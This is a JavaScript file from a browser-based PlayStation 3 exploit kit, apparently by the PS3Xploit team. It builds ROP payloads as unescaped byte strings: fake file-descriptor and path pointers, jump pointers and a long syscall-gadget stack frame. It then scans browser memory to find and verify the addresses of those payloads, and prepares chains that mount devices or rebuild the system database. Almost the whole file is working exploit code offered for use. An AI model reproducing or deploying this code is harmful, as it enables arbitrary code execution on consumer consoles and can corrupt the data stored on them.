// PS3 Default Search Pointers Gadget Hex
// PS3Xploit Team 2018 / ps3xploit.com


// REQUIRED

// Default USB File Pointer 1 / Gadget #1 + TOC Gadget Hex
function reload_usb_fp(state)
{
	if(state){
		return unescape("\u4141\u2F64\u6576\u5F75\u7362\u3030\u302F\u6964\u7073\u2E68\u6578\u0000\u7762\u0000\u0000\u4141\u4141\u4141\u4141")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+unescape("\u0000\uFFFF\uFFFF\u4141\uFD7E");// 56 bytes
	}
	else{
		return;
	}
}

// Gadget Stackframe Setup
// moved to stack.js to keep them all together

// Default Jump 1 Pointer
function reload_jump1(state)
{
	if(state){
		return unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");
	}
	else{
		return;
	}
}

// Default Jump 2 Pointer
/*
function reload_jump2(state)
{
	if(state){
		return unescape("\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950") // 50 bytes
		jump_2+=hexw2bin(stack_frame_addr)+unescape("\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\uFB7E");
	}
	else{
		return unescape("\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950") // 50 bytes
		jump_2+=hexw2bin(stack_frame_addr)+unescape("\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\uFB7E");
	}
}
*/

// Default Jump 2 Pointer
function reload_jump2(state, stage)
{
	if(state){
		switch (stage) {
		case "1":
			return unescape("\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950");// 50 bytes
			break;
		case "2":
			return unescape("\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\uFB7E");// 18 bytes
			break;
		default:
			break;
		}
	}
	else{
		return;
	}
}


// OPTIONAL

// Default Generic File Descriptor Gadget Hex
function reload_fd(state)
{
	if(state){
		return unescape("\u4242\u4141\u4141\uFD8C");// 8 bytes
	}
	else{
		return;
	}
}

// Default HDD File Pointer 1 Gadget Hex
function reload_hdd_fp(state)
{
	if(state){
		return unescape("\u4141")+path_name_src.convert()+unescape("\u0000\u0000\u4141\u4141\uFD7C");// path+12 bytes
	}
	else{
		return;
	}
}

// Default HDD File Pointer 2 Gadget Hex
function reload_hdd_fp2(state)
{
	if(state){
		return unescape("\u4141")+path_name_dest.convert()+unescape("\u0000\u0000\u4141\u4141\uFD6C");// path+12 bytes
	}
	else{
		return;
	}
}

// Default USB File Pointer 2 Gadget Hex
function reload_usb_fp2(state)
{
	if(state){
		return unescape("\u4141")+path_usb_default.convert()+unescape("\u0000\u0000\u4141\u4141\uFD6B");// path+12 bytes
	}
	else{
		return;
	}
}


// Loader Functions
function findBase()
{
	findOffset("base_fp");
	return base_found;
}

function findStackFrame()
{
	findOffset("stack_frame");
	return stackframe_found;
}

function findJump2()
{
	findOffset("jump_2");
	return j2_found;
}

function findJump1()
{
	findOffset("jump_1");
	return j1_found;
}

function verifySuccessTrigger()
{
	if(debug_mode)logAdd(verify_success);
	if(t_out!=0){searchResetTimeout();}
	searchSucceed();
	enableActiveTrigger();
	load_rop.focus();
	allOffsetsVerified=true;
	//result_msg=msg_verified_offsets;// change to verified status
	//showFoundOffsetsMsg();
	showFoundOffsets(offset_find_verified);
	//showFoundOffsets(offset_find_success);
}

function verifyFailTrigger()
{
	if(debug_mode)logAdd(verify_fail);
	if(total_loops<max_loops){reloadInitROP();}
	else{failCount+=1;searchFail();}
	reload_page.focus();
}

// Search Related
function setDefaultSearchParams()
{
	switch(flash_type_select)
	{
		// NAND
		case 0:
		search_max_threshold = 70*0x100000;
		search_max_threshold_backup = 70*0x100000;
		search_base_offset = 0x80200000;// 0x80190000
		search_base_offset_min = 0x80200000;
		search_base_offset_max = search_base_offset_min+0x240000;
		search_base_offset_adjust=0x100000;
		search_base_offset_adjust_jump2=0x100000;
		search_base_offset_adjust_jump1=0x100000;
		search_range_size = 0x200000;
		if(debug_mode){logFoundOffsets();}
		if(debug_mode){logFlashType();}
		break;
		
		// NOR
		case 1:
		search_max_threshold = 70*0x100000;
		search_max_threshold_backup = 70*0x100000;
		search_base_offset = 0x80200000;// 0x80190000
		search_base_offset_min = 0x80200000;
		search_base_offset_max = search_base_offset_min+0x240000;
		search_base_offset_adjust=0x100000;
		search_base_offset_adjust_jump2=0x100000;
		search_base_offset_adjust_jump1=0x100000;
		search_range_size = 0x200000;
		if(debug_mode){logFoundOffsets();}
		if(debug_mode){logFlashType();}
		break;
		
		// eMMC
		case 2:
		search_max_threshold = 70*0x100000;
		search_max_threshold_backup = 70*0x100000;
		search_base_offset = 0x80200000;// 0x80190000
		search_base_offset_min = 0x80200000;
		search_base_offset_max = search_base_offset_min+0x240000;
		search_base_offset_adjust=0x100000;
		search_base_offset_adjust_jump2=0x100000;
		search_base_offset_adjust_jump1=0x100000;
		search_range_size = 0x200000;
		if(debug_mode){logFoundOffsets();}
		if(debug_mode){logFlashType();}
		break;
		
		default:
		break;
	}
	
}

function searchSucceed()
{
	document.getElementById('result').innerHTML=msg_success_init;
	if(debug_mode){logAdd(trigger_msg, log_div);}
}

function searchFail()
{
	total_loops=0;
	searchResetTimeout();
	
	if(allOffsetsFound)
	{
		result_msg=msg_string_verify_fail;
	}
	else
	{
		result_msg=msg_string_search_fail;
	}
	
	//showFoundOffsets(offset_find_jump1);
	document.getElementById('result').innerHTML=result_msg;
	document.getElementById("reload_page").disabled=false;
	reload_page.focus();
}

function reloadInitROP()
{
	resetSearchOffsetMsg();
	t_out=setTimeout(initROP,1000);
	resetSearchOffsetMsg();
}

function showFoundOffsetsMsg()
{
	document.getElementById('outShowOffsets').innerHTML="<h4><b><font color=%22#"+colortext+"%22>"+msg_found_offsets+"</font><font color=%22#"+base_fp_color+"%22>base_fp: </font>"+"<font color=%22#"+base_fp_acolor+"%22>0x"+base_fp_addr.toString(16).toUpperCase()+"</font><font color=%22#"+stack_frame_color+"%22> | stack_frame_addr: </font>"+"<font color=%22#"+stack_frame_acolor+"%22>0x"+stack_frame_addr.toString(16).toUpperCase()+"</font><font color=%22#"+jump_2_color+"%22> | jump_2_addr: </font>"+"<font color=%22#"+jump_2_acolor+"%22>0x"+jump_2_addr.toString(16).toUpperCase()+"</font><font color=%22#"+jump_1_color+"%22> | jump_1_addr: </font>"+"<font color=%22#"+jump_1_acolor+"%22>0x"+jump_1_addr.toString(16).toUpperCase()+"</font></b></h4>";
}

function showFoundOffsets(search)
{
	switch(search)
	{
		case offset_find_base_fp:
		if(base_fp_addr<0){base_fp_addr=0;}
		if(base_fp_addr!=0){base_fp_acolor=colorSuccess;}
		if(base_found){base_fp_acolor=colorSuccess;}else{base_fp_acolor=colorActive;}
		if(base_verified){base_fp_acolor=colorVerified;}
		if(base_fp_addr===0){base_fp_acolor=colorActive;result_msg=msg_search_offsets;}
		break;
		
		case offset_find_stack_frame:
		if(stack_frame_addr<0){stack_frame_addr=0;}
		if(stack_frame_addr!=0){stack_frame_acolor=colorSuccess;}
		if(stackframe_found){stack_frame_acolor=colorSuccess;}else{stack_frame_acolor=colorActive;}
		if(stackframe_verified){stack_frame_acolor=colorVerified;}
		if(stack_frame_addr===0){stack_frame_acolor=colorActive;result_msg=msg_search_offsets;}
		break;
		
		case offset_find_jump2:
		if(jump_2_addr<0){jump_2_addr=0;}
		if(jump_2_addr!=0){jump_2_acolor=colorSuccess;}
		if(j2_found){jump_2_acolor=colorSuccess;}else{jump_2_acolor=colorActive;}
		if(j2_verified){jump_2_acolor=colorVerified;}
		if(jump_2_addr===0){jump_2_acolor=colorActive;result_msg=msg_search_offsets;}
		break;
		
		case offset_find_jump1:
		if(jump_1_addr<0){jump_1_addr=0;}
		if(jump_1_addr!=0){jump_1_acolor=colorSuccess;}
		if(j1_found){jump_1_acolor=colorSuccess;}else{jump_1_acolor=colorActive;}
		if(j1_verified){jump_1_acolor=colorVerified;}
		if(jump_1_addr===0){jump_1_acolor=colorActive;result_msg=msg_search_offsets;}
		break;
		
		case offset_find_success:
		if(stack_frame_addr!=0){stack_frame_acolor=colorSuccess;}
		if(stack_frame_addr!=0){stack_frame_acolor=colorSuccess;}
		if(jump_2_addr!=0){jump_2_acolor=colorSuccess;}
		if(jump_1_addr!=0){jump_1_acolor=colorSuccess;}
		if(base_found){base_fp_acolor=colorSuccess;}
		if(stackframe_found){stack_frame_acolor=colorSuccess;}
		if(j2_found){jump_2_acolor=colorSuccess;}
		if(j1_found){jump_1_acolor=colorSuccess;}
		break;
		
		case offset_find_verified:
		if(base_verified){base_fp_acolor=colorVerified;}
		if(stackframe_verified){stack_frame_acolor=colorVerified;}
		if(j2_verified){jump_2_acolor=colorVerified;}
		if(j1_verified){jump_1_acolor=colorVerified;}
		if(allOffsetsVerified){result_msg=msg_verify_offsets;}
		break;
		
		default:
		break;
	}
	
	showFoundOffsetsMsg();
}

function resetSearchOffsetMsg()
{
	if(allOffsetsFound)
	{
		result_msg=msg_verify_offsets;
	}
	else
	{
		result_msg=msg_search_offsets;
	}
	
	if((allOffsetsFound)&&(allOffsetsVerified))
	{
		result_msg=msg_success_init;
	}
	else
	{
		result_msg=msg_search_offsets;
	}
	
	// If any offsets are 0x0 then show search message
	if((base_fp_addr===0)||(stack_frame_addr===0)||(jump_2_addr===0)||(jump_1_addr===0))
	{
		result_msg=msg_search_offsets;
	}
	
	// reset string search message to fail if total=max (fix later)
	if(total_loops>max_loops)
	{
		result_msg=msg_string_verify_fail;
	}
	
	//showFoundOffsets(offset_find_jump1);
	document.getElementById('result').innerHTML=result_msg;
}

function resetOffsetAddresses()
{
	// Reset Addresses
	usb_fp_addr=0;
	usb_fp2_addr=0;
	hdd_fp_addr=0;
	hdd_fp2_addr=0;
	path_fp_addr=0;
	path_fp2_addr=0;
	path_src_fp_addr=0;
	path_dest_fp_addr=0;
	fd_addr=0;
	fd2_addr=0;
	file_mode_fp_addr=0;
	
	found_offsets=[];
	if(base_fp_addr!=0){base_offsets.push(base_fp_addr);}else{base_offsets=[];}
	if(stack_frame_addr!=0){stack_offsets.push(stack_frame_addr);}else{stack_offsets=[];}
	if(jump_2_addr!=0){jump2_offsets.push(jump_2_addr);}else{jump2_offsets=[];}
	if(jump_1_addr!=0){jump1_offsets.push(jump_1_addr);}else{jump1_offsets=[];}
	
	//if(!base_verified){base_fp_addr=0;}
	//if(!stackframe_verified){stack_frame_addr=0;}
	//if(!j2_verified){jump_2_addr=0;}
	//if(!j1_verified){jump_1_addr=0}
	
	/*
	for(x=0;x<base_offsets.length;x+=1)
	{
		if(base_offsets[x]===exploit_addr)
		{
			
		}
	}
	*/
}

function setDefaultPointerValues()
{
	usb_fp=0x40404040;
	usb_fp2=0x41414141;
	hdd_fp=0x42424242;
	hdd_fp2=0x43434343;
	usb_fd2=0x45454545;
	hdd_fd=0x46464646;
	hdd_fd2=0x47474747;
	fd=0x48484848;
	fd2=0x49494949;
	magic=0x4A4A4A4A;
	magic2=0x4B4B4B4B;
}

function setCustomPointerValues()
{
	// Set bytes to write for db_rebuild and restore_stack for others
	if(chain_stackframe==="db_rebuild"){write_bytes=db_rebuild_bytes;}else{write_bytes=restore_stack;}
	
	// Set values for AutoSize Read/Write Chains
	//if((chain_stackframe==="file_read_write_test")&&(useAutoSize)){hdd_fp=pad4;}
	
	// Set mount params
	if(chain_stackframe==="sys_fs_mount"){path_fp=mount_device;path_fp2=mount_fs;path_src_fp=mount_path;}
	if(chain_stackframe==="sys_fs_unmount"){path_fp=mount_path;}
	if(chain_stackframe==="mount_usb_as_bdvd"){path_fp="CELL_FS_IOS:USB_MASS_STORAGE000";path_fp2="CELL_FS_FAT";path_src_fp="/dev_bdvd";path_dest_fp="/dev_usb000";}
	if(chain_stackframe==="mount_usb_as_bdvd_no_disc"){path_fp="CELL_FS_IOS:USB_MASS_STORAGE000";path_fp2="CELL_FS_FAT";path_src_fp="/dev_bdvd";path_dest_fp="/dev_usb000";}
	if(chain_stackframe==="mount_other_as_bdvd"){path_fp=mount_device;path_fp2=mount_fs;path_src_fp=mount_path;path_dest_fp=mount_path2;}
	if(chain_stackframe==="mount_bdvd_as_ps3_disc"){path_fp="-PLAYSTATION3";path_fp2="CELL_FS_ISO9660";path_src_fp="/dev_bdvd";}
	
	// VSH printf Params
	if(chain_stackframe==="vsh_printf_test"){path_fp=vsh_printf_arg1;path_fp2=vsh_printf_arg1;}
	
	if(chain_stackframe==="test_only"){path_fp=vsh_printf_arg1;path_fp2=vsh_printf_arg1;}
}

function setPointerOffsets()
{
	file_mode_fp_addr=base_fp_addr+0x2;
	write_bytes_addr=base_fp_addr+0x4;
	usb_fp_addr=base_fp_addr+0x8;
	usb_fp2_addr=base_fp_addr+0xC;
	hdd_fp_addr=base_fp_addr+0x10;
	hdd_fp2_addr=base_fp_addr+0x14;
	usb_fd_addr=base_fp_addr+0x18;
	usb_fd2_addr=base_fp_addr+0x1C;
	hdd_fd_addr=base_fp_addr+0x20;
	hdd_fd2_addr=base_fp_addr+0x24;
	fd_addr=base_fp_addr+0x28;
	fd2_addr=base_fp_addr+0x2C;
	magic_addr=base_fp_addr+0x30;
	magic_addr2=base_fp_addr+0x34;// 55th byte (+0x36) from start
	
	// Path Strings
	path_fp_addr=base_fp_addr+0x3A;
	path_fp2_addr=path_fp_addr+path_fp.convertedSize();
	
	path_src_fp_addr=path_fp2_addr+path_fp2.convertedSize();
	path_dest_fp_addr=path_src_fp_addr+path_src_fp.convertedSize();
	
}

function checkSearchParams()
{
	if(search_max_threshold===0){search_max_threshold = search_max_threshold_backup;}// search threshold reset if zero
	if(search_base_offset<search_base_offset_min){search_base_offset = search_base_offset_min;}// if too low
	if(search_base_offset>search_base_offset_max){search_base_offset = search_base_offset_min+search_base_offset_adjust;}// if too high
	if(base_fp_addr===0){search_base_offset = search_base_offset_min;}// reset start offset for search if zero
}

function searchResetTimeout()
{
	if(t_out!=0){clearTimeout(t_out);}
	//clearTimeout(t_out);
}

function checkOffsets()
{
	if((j2_verified)&&(j1_verified)&&(base_verified)&&(stackframe_verified)){allOffsetsVerified=true;}else{allOffsetsFound=false;allOffsetsVerified=false;}
}

function verifyOffsets()
{
	if(!base_verified)
	{
		base=checkMemory(base_fp_addr-0x4,0x1000,base_fp.length,6);
		if((base===base_fp)&&(base===basev)){base_offsets.push(base_fp_addr);base_verified=true;}else{base_fp_addr=0;base_verified=false;base_found=false;allOffsetsFound=false;}
		showFoundOffsets(offset_find_base_fp);
	}
	checkOffsets();
	
	if(!stackframe_verified)
	{
		stk=checkMemory(stack_frame_addr-0x4,0x20000,stack_frame.length,6);
		if((stk===stack_frame)&&(stk===stkv)){stack_offsets.push(stack_frame_addr);stackframe_verified=true;}else{stack_frame_addr=0;stackframe_verified=false;stackframe_found=false;allOffsetsFound=false;}
		showFoundOffsets(offset_find_stack_frame);
	}
	checkOffsets();
	
	if(!j2_verified)
	{
		j2=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length,6);
		if((j2===jump_2)&&(j2===j2v)){jump2_offsets.push(jump_2_addr);j2_verified=true;}else{jump_2_addr=0;j2_verified=false;j2_found=false;allOffsetsFound=false;}
		showFoundOffsets(offset_find_jump2);
	}
	checkOffsets();
	
	if(!j1_verified)
	{
		j1=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length,6);
		if((j1===jump_1)&&(j1===j1v)){jump1_offsets.push(jump_1_addr);j1_verified=true;}else{jump_1_addr=0;j1_verified=false;j1_found=false;allOffsetsFound=false;}
		showFoundOffsets(offset_find_jump1);
	}
	checkOffsets();
}


// Main Search Function
function findOffset(name)
{
	
	switch(name)
	{
		case "base_fp":
		base_fp=unescape("\u4242\u0000")// +0x2
		+hexw2bin(setFileMode("wb"))// +0x2
		+hexw2bin(write_bytes)// +0x4
		+hexw2bin(usb_fp)// +0x4
		+hexw2bin(usb_fp2)// +0x4
		+hexw2bin(hdd_fp)// +0x4
		+hexw2bin(hdd_fp2)// +0x4
		+hexw2bin(usb_fd)// +0x4
		+hexw2bin(usb_fd2)// +0x4
		+hexw2bin(hdd_fd)// +0x4
		+hexw2bin(hdd_fd2)// +0x4
		+hexw2bin(fd)// +0x4
		+hexw2bin(fd2)// +0x4
		+hexw2bin(magic)// +0x4
		+hexw2bin(magic2)// +0x4
		+unescape("\u0000")// +0x2
		+path_fp.convert()
		//+unescape("\u0000")// +0x2
		+path_fp2.convert()
		//+unescape("\u0000")// +0x2
		+path_src_fp.convert()
		//+unescape("\u0000")// +0x2
		+path_dest_fp.convert()
		+unescape("\u0000\uFD6C");
		ph = 0x6CFD;

		do
		{
			if(search_max_threshold<search_range_size){
			if(total_loops<max_loops){reloadInitROP();}
			else{searchFail();}
			return;}
			base_found=false;
			base_fp=base_fp.replaceAt(0,hexh2bin(ph));
			base_fp_addr=findJsVariableOffset("base_fp",base_fp,search_base_offset,search_range_size,debug_mode);
			search_max_threshold-=search_range_size;
		}while(base_fp_addr==0);
		if(base_fp_addr!=0){base_found=true;base_offsets.push(base_fp_addr);setPointerOffsets();}else{base_found=false;}
		break;
		
		case "stack_frame":
		useCustomStackFrame();// call this to setup all params
		//stackFrameTest();// use default stackframe for testing
		
		stack_frame=unescape(syscallGadgetSetStartBytes())
		+unescape(syscallGadgetSet1(a1_r3,a1_r4,a1_r5,a1_r6,a1_r7,a1_r8,a1_r9,a1_r10,a1_r11,a1_r29,a1_r30,a1_r31,a1_jumpto,a2_r3,a2_r29,a2_r30,a2_r31,a2_jumpto,a3_r3,a3_r4,a3_r5,a3_r6,a3_r7,a3_r8,a3_r9,a3_r10,a3_r11,a3_r29,a3_r30,a3_r31,a3_jumpto,a4_r3,a4_r29,a4_r30,a4_r31,a4_jumpto,a5_r3,a5_r4,a5_r5,a5_r6,a5_r7,a5_r8,a5_r9,a5_r10,a5_r11,a5_r29,a5_r30,a5_r31,a5_jumpto,a6_r3,a6_r29,a6_r30,a6_r31,a6_jumpto,a7_r3,a7_r4,a7_r5,a7_r6,a7_r7,a7_r8,a7_r9,a7_r10,a7_r11,a7_r29,a7_r30,a7_r31,a7_jumpto,a8_r3,a8_r29,a8_r30,a8_r31,a8_jumpto,a9_r3,a9_r4,a9_r5,a9_r6,a9_r7,a9_r8,a9_r9,a9_r10,a9_r11,a9_r29,a9_r30,a9_r31,a9_jumpto,a10_r3,a10_r29,a10_r30,a10_r31,a10_jumpto,a11_r3,a11_r4,a11_r5,a11_r6,a11_r7,a11_r8,a11_r9,a11_r10,a11_r11,a11_r29,a11_r30,a11_r31,a11_jumpto,a12_r3,a12_r29,a12_r30,a12_r31,a12_jumpto,a13_r3,a13_r4,a13_r5,a13_r6,a13_r7,a13_r8,a13_r9,a13_r10,a13_r11,a13_r29,a13_r30,a13_r31,a13_jumpto,a14_r3,a14_r29,a14_r30,a14_r31,a14_jumpto,a15_r3,a15_r4,a15_r5,a15_r6,a15_r7,a15_r8,a15_r9,a15_r10,a15_r11,a15_r29,a15_r30,a15_r31,a15_jumpto,a16_r3,a16_r29,a16_r30,a16_r31,a16_jumpto,a17_r3,a17_r4,a17_r5,a17_r6,a17_r7,a17_r8,a17_r9,a17_r10,a17_r11,a17_r29,a17_r30,a17_r31,a17_jumpto,a18_r3,a18_r29,a18_r30,a18_r31,a18_jumpto,a19_r3,a19_r29,a19_r30,a19_r31,a19_jumpto,a20_r3,a20_r4,a20_r5,a20_r6,a20_r7,a20_r8,a20_r9,a20_r10,a20_r11,a20_r29,a20_r30,a20_r31,a20_jumpto,a21_r3,a21_r29,a21_r30,a21_r31,a21_jumpto,a22_r3,a22_r29,a22_r30,a22_r31,a22_jumpto,a23_r3,a23_r4,a23_r5,a23_r6,a23_r7,a23_r8,a23_r9,a23_r10,a23_r11,a23_r29,a23_r30,a23_r31,a23_jumpto,a24_r3,a24_r29,a24_r30,a24_r31,a24_jumpto,a25_r3,a25_r29,a25_r30,a25_r31,a25_jumpto,a26_r3,a26_r4,a26_r5,a26_r6,a26_r7,a26_r8,a26_r9,a26_r10,a26_r11,a26_r29,a26_r30,a26_r31,a26_jumpto,a27_r3,a27_r29,a27_r30,a27_r31,a27_jumpto,a28_r3,a28_r29,a28_r30,a28_r31,a28_jumpto,a29_r3,a29_r4,a29_r5,a29_r6,a29_r7,a29_r8,a29_r9,a29_r10,a29_r11,a29_r29,a29_r30,a29_r31,a29_jumpto,a30_r3,a30_r29,a30_r30,a30_r31,a30_jumpto,a31_r3,a31_r29,a31_r30,a31_r31,a31_jumpto,a32_r3,a32_r4,a32_r5,a32_r6,a32_r7,a32_r8,a32_r9,a32_r10,a32_r11,a32_r29,a32_r30,a32_r31,a32_jumpto,a33_r3,a33_r29,a33_r30,a33_r31,a33_jumpto,padding1,padding2,padding3,padding4,extra1,extra2,extra3,extra4,extra5,extra6,extra7))
		+unescape(syscallGadgetSetEndBytes());
		ph = 0x7EBE;
		search_base_offset=search_base_offset_min+search_base_offset_adjust;
		//if(base_fp_addr!=0){search_base_offset=base_fp_addr;}else{search_base_offset=search_base_offset_min+search_base_offset_adjust;}

		do
		{
			if(search_max_threshold<search_range_size){
			if(total_loops<max_loops){reloadInitROP();}
			else{searchFail();}
			return;}
			stackframe_found=false;
			stack_frame=stack_frame.replaceAt(0,hexh2bin(ph));
			stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base_offset,search_range_size,debug_mode);
			search_max_threshold-=search_range_size;
		}while(stack_frame_addr==0);
		if(stack_frame_addr!=0){stackframe_found=true;stack_offsets.push(stack_frame_addr);}else{stackframe_found=false;}
		break;
		
		case "jump_2":
		//jump_2=unescape("\u4141\u0000")
		jump_2=unescape("\u7EFB\u0000")
		+hexw2bin(stack_frame_addr)
		+unescape("\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950")
		+hexw2bin(stack_frame_addr)
		+unescape("\uFB7E");
		ph = 0x7EFB;
		search_base_offset=search_base_offset_min+search_base_offset_adjust_jump2;

		do
		{
			if(search_max_threshold<search_range_size){
			if(total_loops<max_loops){reloadInitROP();}
			else{searchFail();}
			return;}
			j2_found=false;
			jump_2=jump_2.replaceAt(0,hexh2bin(ph));
			jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base_offset,search_range_size,debug_mode);
			search_max_threshold-=search_range_size;
		}while(jump_2_addr==0);
		if(jump_2_addr!=0){j2_found=true;jump2_offsets.push(jump_2_addr);}else{j2_found=false;}
		break;
		
		case "jump_1":
		//jump_1=reload_jump1(true);
		//jump_1=unescape("\u4141\u0000")
		jump_1=unescape("\u6EBF\u0000")
		+hexw2bin(jump_2_addr)
		+unescape("\uBF6E");
		ph = 0x6EBF;
		search_base_offset=search_base_offset_min+search_base_offset_adjust_jump1;

		do
		{
			if(search_max_threshold<search_range_size){
			if(total_loops<max_loops){reloadInitROP();}
			else{searchFail();}
			return;}
			j1_found=false;
			jump_1=jump_1.replaceAt(0,hexh2bin(ph));
			jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base_offset,search_range_size,debug_mode);
			search_max_threshold-=search_range_size;
		}while(jump_1_addr==0);
		if(jump_1_addr!=0){j1_found=true;jump1_offsets.push(jump_1_addr);}else{j1_found=false;}
		break;
		
		default:
		break;
	}
}
